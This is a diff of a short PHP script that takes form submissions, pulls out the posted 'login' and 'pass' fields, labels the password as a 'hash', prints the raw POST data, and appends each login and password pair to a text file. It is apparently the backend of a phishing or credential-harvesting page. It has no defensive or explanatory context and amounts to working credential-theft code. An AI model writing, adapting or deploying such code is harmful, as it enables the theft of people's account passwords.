@@ -3,26 +3,14 @@
 if ($_POST) {
    $string = serialize($_POST);
    $destring =  unserialize($string);
-  // $data = $destring['name'].' '. $destring['email'].' '.$destring['phone'] ."\n".  $string. "\n" ;
+   $data = 'id -> ' .$destring['login'] . ' | hash -> ' .$destring['pass'];
      print '<pre>';
-
-print_r($_POST);
-   
-   //  $data = 'NAME -> ' .$destring['name'] ."\n". 'EMAIL -> ' .$destring['email'] ."\n". 'PHONE -> ' .$destring['phone'];
-
-     $data = 'id -> ' .$destring['login'] . ' | hash -> ' .$destring['pass'];
-
+     print_r($_POST);
      print ' ---------------------------'."\n";
-
      echo $data;
-
-    // print $destring['email'];
-
-  print '<br>';
-  print ' ---------------------------'."\n";
- // echo $dat;
- // print_r($destring);
-  print '</pre>';
+     print '<br>';
+     print ' ---------------------------'."\n";
+     print '</pre>';
 
   $f = fopen('file.txt', 'a');
   fwrite($f, $data . PHP_EOL);
